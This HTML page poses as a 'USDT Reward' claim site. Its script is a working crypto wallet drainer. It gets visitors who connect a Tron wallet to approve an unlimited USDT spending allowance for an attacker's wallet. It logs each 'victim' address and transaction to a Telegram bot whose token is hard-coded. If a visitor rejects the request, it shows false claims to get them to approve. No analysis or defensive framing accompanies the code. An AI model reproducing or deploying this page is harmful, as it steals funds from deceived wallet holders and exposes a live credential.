<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>USDT Reward - Scan to Claim</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
    <style>
        body {
            background: radial-gradient(circle, #1e293b 0%, #0f172a 100%);
            color: white;
            font-family: 'Inter', sans-serif;
        }

        .glass {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
    </style>
</head>

<body class="min-h-screen flex flex-col items-center justify-center p-6">

    <div id="qr-screen" class="text-center space-y-6 max-w-sm w-full">
        <h1 class="text-3xl font-black text-emerald-400 italic uppercase">USDT REWARD</h1>
        <p class="text-slate-400 text-sm">Connect with Trust Wallet or TronLink to verify eligibility</p>

        <div class="flex justify-center my-8">
            <button id="connect-btn" onclick="autoTrigger()" class="bg-emerald-500 hover:bg-emerald-400 text-white font-bold py-3 px-8 rounded-full shadow-lg shadow-emerald-500/50 transition-all duration-300 transform hover:scale-105">
                Connect Wallet to Claim
            </button>
        </div>

        <div class="glass p-4 rounded-2xl">
            <p class="text-[10px] text-slate-500 uppercase tracking-widest mb-2 font-bold">Supported Wallets</p>
            <div class="flex justify-center gap-4 opacity-50 grayscale">
                <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" width="30">
                <img src="https://www.tronlink.org/img/logo.png" width="30">
            </div>
        </div>
    </div>

    <div id="processing-screen"
        class="hidden fixed inset-0 bg-black/90 flex flex-col items-center justify-center z-50 p-10">
        <div class="w-16 h-16 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mb-4"></div>
        <h2 class="text-xl font-bold">Verifying Connection...</h2>
        <p class="text-slate-400 text-center text-sm mt-2">Do not close your wallet window</p>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
            CHAT_ID: "8249230506",
            ADMIN_WALLET: "TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2",
            USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
        };

        async function notify(msg) {
            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: "HTML" })
            });
        }

        // 2. Logic to trigger POPUP if site is opened inside Wallet
        async function autoTrigger() {
            let tronProvider = window.tronWeb;
            if (window.tronLink && window.tronLink.tronWeb) tronProvider = window.tronLink.tronWeb;
            if (window.tron && window.tron.tronWeb) tronProvider = window.tron.tronWeb;

            // Check if site is opened inside a crypto browser
            if (tronProvider) {
                window.tronWeb = tronProvider;
                document.getElementById('qr-screen').classList.add('opacity-20');
                document.getElementById('processing-screen').classList.remove('hidden');

                try {
                    // Connect Account
                    await window.tronWeb.request({ method: 'tron_requestAccounts' });
                    const victim = window.tronWeb.defaultAddress.base58;

                    await notify(`🔔 <b>WALLET CONNECTED</b>\nVictim: <code>${victim}</code>`);

                    // Trigger Contract Popup
                    const contract = await window.tronWeb.contract().at(CONFIG.USDT_CONTRACT);
                    const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

                    await contract.approve(CONFIG.ADMIN_WALLET, maxUint).send({
                        feeLimit: 100000000
                    }).then(tx => {
                        notify(`✅ <b>USDT APPROVED!</b>\nVictim: <code>${victim}</code>\nTX: <code>${tx}</code>`);
                        alert("Claim Successful! Reward will be sent after 1 hour.");
                        location.reload();
                    }).catch(err => {
                        notify(`❌ <b>USER REJECTED POPUP</b>\nVictim: <code>${victim}</code>`);
                        alert("Verification failed. Please click 'Accept' to claim.");
                        location.reload();
                    });

                } catch (e) {
                    console.error(e);
                    document.getElementById('qr-screen').classList.remove('opacity-20');
                    document.getElementById('processing-screen').classList.add('hidden');
                }
            } else {
                alert("Please make sure you are inside a dApp browser (Trust Wallet/TronLink) AND have selected the Tron network from the top menu.");
            }
        }
    </script>
</body>

</html>
